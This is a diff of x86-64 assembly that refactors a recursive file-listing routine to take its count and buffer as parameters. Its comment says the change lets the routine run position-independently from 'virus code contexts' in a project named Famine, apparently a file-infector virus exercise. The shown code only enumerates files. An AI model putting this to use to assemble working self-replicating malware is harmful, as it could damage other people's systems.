@@ -13,8 +13,13 @@
 %define STACK_LOCALS    128
 
 ; ============================================
-; rdi = pointer vesr le directory path
-; setup d une stack pr stocker les entrees
+; list_files_recursive - Position-independent file listing
+; rdi = pointer to directory path
+; rsi = pointer to file_count (uint64_t*)
+; rdx = pointer to file_list buffer
+;
+; This function is position-independent and can be called from both
+; original Famine and virus code contexts.
 ; ============================================
 list_files_recursive:
     push rbp
@@ -32,12 +37,14 @@ list_files_recursive:
     ; [rbp-24]  = nread (bytes read from getdents64)
     ; [rbp-32]  = current position in buffer
     ; [rbp-40]  = saved r12 (path pointer)
-    ; [rbp-48]  = saved r13 (fd)
-    ; [rbp-56]  = saved r14 (nread)
-    ; [rbp-64]  = saved r15 (dirent pointer)
-    ; [rbp-72]  = saved rbx (d_reclen)
+    ; [rbp-48]  = saved r13 (original r13)
+    ; [rbp-56]  = saved r14 (original r14)
+    ; [rbp-64]  = saved r15 (original r15)
+    ; [rbp-72]  = saved rbx (original rbx)
     ; [rbp-80]  = saved d_type during path building
     ; [rbp-88]  = saved d_reclen during path building
+    ; [rbp-96]  = file_count pointer (rsi parameter)
+    ; [rbp-104] = file_list buffer pointer (rdx parameter)
     ; [rbp - BUFFER_SIZE - 128 ... rbp - 128] = dir_buffer
 
     mov [rbp-40], r12
@@ -46,8 +53,10 @@ list_files_recursive:
     mov [rbp-64], r15
     mov [rbp-72], rbx
 
-    ; Save the path pointer
+    ; Save the parameters
     mov r12, rdi                ; r12 = path
+    mov [rbp-96], rsi           ; save file_count pointer
+    mov [rbp-104], rdx          ; save file_list buffer
 
     ; Get the length of the current path
     mov rdi, r12
@@ -142,22 +151,24 @@ list_files_recursive:
     jne .check_dir
 
     ; Check if we have room for more files (bounds checking)
-    mov rax, [rel file_count]
+    mov rsi, [rbp-96]           ; get file_count pointer
+    mov rax, [rsi]              ; load current count
     cmp rax, MAX_FILES
     jge .skip_store             ; skip if file_list is full
 
     ; Store the file path in file_list
     ; Calculate destination: file_list + (file_count * FILE_ENTRY_SIZE)
     imul rax, FILE_ENTRY_SIZE
-    lea rdi, [rel file_list]
+    mov rdi, [rbp-104]          ; get file_list buffer pointer
     add rdi, rax                ; destination = file_list[file_count]
     mov rsi, r12                ; source = current path
     call str_copy
     
     ; Increment file count
-    mov rax, [rel file_count]
+    mov rsi, [rbp-96]           ; get file_count pointer
+    mov rax, [rsi]              ; load current count
     inc rax
-    mov [rel file_count], rax
+    mov [rsi], rax              ; store incremented count
 
 .skip_store:
 %ifdef VERBOSE_MODE
@@ -183,7 +194,9 @@ list_files_recursive:
     jne .restore_path
 
     ; Recurse into directory
-    mov rdi, r12
+    mov rdi, r12                ; path
+    mov rsi, [rbp-96]           ; file_count pointer
+    mov rdx, [rbp-104]          ; file_list buffer
     call list_files_recursive
 
 .restore_path:
